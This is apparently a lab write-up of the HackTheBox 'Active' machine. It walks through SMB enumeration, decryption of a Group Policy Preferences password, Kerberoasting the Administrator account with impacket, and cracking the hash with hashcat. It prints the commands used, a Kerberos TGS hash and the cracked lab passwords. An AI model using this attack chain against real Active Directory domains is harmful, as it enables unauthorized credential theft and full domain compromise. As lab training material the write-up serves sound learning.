

# Given

> Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.

## IP

10.10.10.100

# Steps

## Enumeration

I started off with `rustscan` to see what ports are open, and this gave me a decent idea of what services were running on this machine.

```bash
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 64
88/tcp    open  kerberos-sec   syn-ack ttl 64
135/tcp   open  msrpc          syn-ack ttl 64
139/tcp   open  netbios-ssn    syn-ack ttl 64
389/tcp   open  ldap           syn-ack ttl 64
445/tcp   open  microsoft-ds   syn-ack ttl 64
464/tcp   open  kpasswd5       syn-ack ttl 64
593/tcp   open  http-rpc-epmap syn-ack ttl 64
636/tcp   open  ldapssl        syn-ack ttl 64
5722/tcp  open  msdfsr         syn-ack ttl 64
9389/tcp  open  adws           syn-ack ttl 64
49152/tcp open  unknown        syn-ack ttl 64
49153/tcp open  unknown        syn-ack ttl 64
49154/tcp open  unknown        syn-ack ttl 64
49155/tcp open  unknown        syn-ack ttl 64
49157/tcp open  unknown        syn-ack ttl 64
49158/tcp open  unknown        syn-ack ttl 64
49165/tcp open  unknown        syn-ack ttl 64
49166/tcp open  unknown        syn-ack ttl 64
49168/tcp open  unknown        syn-ack ttl 64
```

The `nmap` scan I had running in the background gave me some version info, filled in the blanks on some of the 'unknown' services.

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-20 03:21:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Some key points about this machine are

- Target is running Windows Server 2008 R2 SP1
- Services running:
	- DNS (53)
	- Kerberos (88)
	- RPC (135)
	- SMB (139, 445)
	- LDAP (389, 3268)
	- HTTP (47001)
- Hostname is DC so this is possibly the Domain Controller.

SMB is the easiest one to test without credentials, so I checked for anonymous user access with `netexec`.

![](Assets/Pasted%20image%2020250720120505.png)

From that I saw a total of 7 shares, and 'Replication' could be read with out level of access. There were some things inside it, so I used netexec to download everything inside the share.

```bash
nxc smb 10.10.10.100 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

I Managed to get 2 folders with some policy info, which made me think of Group Policy Preferences. 

![](Assets/Pasted%20image%2020250720122804.png)

## Cracking GPP

**GPP TLDR** 
Group Policy Preferences are config settings that domain admins can enforce on local admins/users across a domain. 
When a new Group Policy Preference (GPP) is created, an xml file is stored on the SYSVOL with its config data. However the password in that xml file (cpassword) is encrypted with MS AES. Not that cracking it is a problem after MS published the key. 

I looked at the `Groups.xml` file, and managed to get some creds that could be of use.

![](Assets/Pasted%20image%2020250720122548.png)

Since I knew we were dealing with a GPP hash, I used `gpp-decrypt` to crack the hash, and I ended up with the password to the user account `SVC_TGS`.

![](Assets/Pasted%20image%2020250720133446.png)

I got excited about this, and kept trying to get a shell into the system here. But things didn't work out. After a while, I went back to looking at what this account could access. SMB.

This time I could read more shares. I decided to look at the Users share first. That got me to this user's Desktop, where I found the user flag.

![](Assets/Pasted%20image%2020250720144629.png)

## Getting Admin

Since this is an AD environment, I cold check for kerberoastable accounts using `impacket-GetUserSPNs`. Alternatively I could use `netexec` to try and grab a kerberos hash from a roastable account. However, there's the clock skew to deal with here, and that could easily be countered with faketime in case ntpdate doesn't work.

I found out that the Administrator account was kerberoastable, and then I got the kerberos hash from it.

![](Assets/Pasted%20image%2020250720151013.png)

The next step when I had a hash on hand was to identify it. I decided to use hashcat, because I needed to get the correct mode for the job.

![](Assets/Pasted%20image%2020250720152019.png)

Ran`hashcat -m 13100 -a 0 -o admin.cracked.txt loot/admin.krb.hash /usr/share/wordlists/rockyou.txt`, which got me the Admin password.

![](Assets/Pasted%20image%2020250720152611.png)

Tested it out with smb, and it works. I can log in as Administrator.

![](Assets/Pasted%20image%2020250720153216.png)

Just like the last time, I used `smbclient` to interact with the SMB service. This time as the Administrator. The root flag was on the desktop.

```bash
┌──(root㉿docker-desktop)-[/host_data]
└─# smbclient \\\\10.10.10.100\\Users -U administrator
Password for [WORKGROUP\administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 14:39:20 2018
  ..                                 DR        0  Sat Jul 21 14:39:20 2018
  Administrator                       D        0  Mon Jul 16 10:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 05:06:44 2009
  Default                           DHR        0  Tue Jul 14 06:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 05:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 04:57:55 2009
  Public                             DR        0  Tue Jul 14 04:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 15:16:32 2018

5217023 blocks of size 4096. 278484 blocks available
```

# Creds

**Groups.xml**
`SVC_TGS : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ : GPPstillStandingStrong2k18`

**Administrator kerberos hash**

```bash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$0a8b0f16cbd7dacd1dca8c5688e5b5be$71d27a8950563cd5a294b87ba1b6591c0afd5c
486a740fd3cad3892497312e7349693778bcd6b7d9a7c13cde751e07fc8917ab2e9acf0f2da90c6416f000f89475ba08a90c8604dae7f57bd8215275a5d76f185379dfb34b4189ae5cb8c96f870aef1679432bcf81cbfad9bc0ece74a07
f77461b94e254bb2c71d616bfa07cf4e59a8a04516e4c764fbfce60b13d6d9de36eee57805bfbb7cc0d9a291da54b02cbb6b4d4c1902b0d7418c44dc5559d927c25307850f91f1585a77befb2b06c7d654d5b19f61c491d64c037cd5e02
c404764e10f0f22d2b11f9952fee4f6263ea11b9c5a89b0051beba5ff69c2ae0eb215419f96a6b9440ebdfae217a8ca3373560ae639950c426323e642a39bacefb97f3733c26dedeb2ffb3d880d528aaca99b21094cd5847a6c72b85e95
6dcc04a1331f83cf0999b89ea804a8fe7caa0a34c2dd346aa266d63f48eb837d454609610643d76b6c9ad779f549fea08c16ba7f10d5a1a20389c836589403e5dcef09a0cd99cfaf62cb121962de037e535cc34ba9fd792d9e890b80db9
a733df10eb1f8265fb296caa57e971cf092fdf02bba7f90007e21d33f191429cac49fae1e43047505cfdd220da0698a42a531266400985f4d90543c1eec0ddd627f27425a40cfbba1633858e62b81260622c458c103a5fdcd78977f998f
7bca04cb7c1974505a17bf43b995658f22537061567e46c9d5b3e0234ae56bb55b7f89ca29fb11acdb15379315fff69f97dc2e479d77927c81403aa6080b261f60da4bca52bd60de56fe53a78a87f5c8306f26cda40dafbd01249433724
d1b496912f3ec47927b7c7af5bb6160b12483de4829c8d0dfc264d77a64d3ce6d2fe671866d8132058f3c8d2988c795936c27b839db7de3deae1ccfd917b6561e3d1be725e69d82afc631ae00661c9d3fbf9e8bcfa114d0634341e56cd0
f9ae1cb9a9479b742eb9309329e7ce0df037aca180be9498e367f6426a2f9143e9bf5c2d6572af2a6b1d4dc42c87d502927df97f4ef6c3d2a98327b3b124436ddb88d1db8c9c2ebcddc75444915f2d4a5c7b09dd779f09a32952b25702c
05db14ff79ac4ea6801a55243902b4789bd8d92bfb7a40732c9845865f13159ba1aa01d0dc7c2e05756b19e481897cc7ae77bec45cbd7d7795e4c55f22d53a972e80d92f02e60e72771bd492e67beaadf4d12b5c26acc4099e58dd598ff
4a0005fea8668e658ef4883345458ee433a69b8746a96216cc490ef3626
```

**Administrator Password**
`Ticketmaster1968`

# Proof

![](Assets/Pasted%20image%2020250720144918.png)

![](Assets/Pasted%20image%2020250720153541.png)

# References

https://pentestlab.blog/2017/03/20/group-policy-preferences/

https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences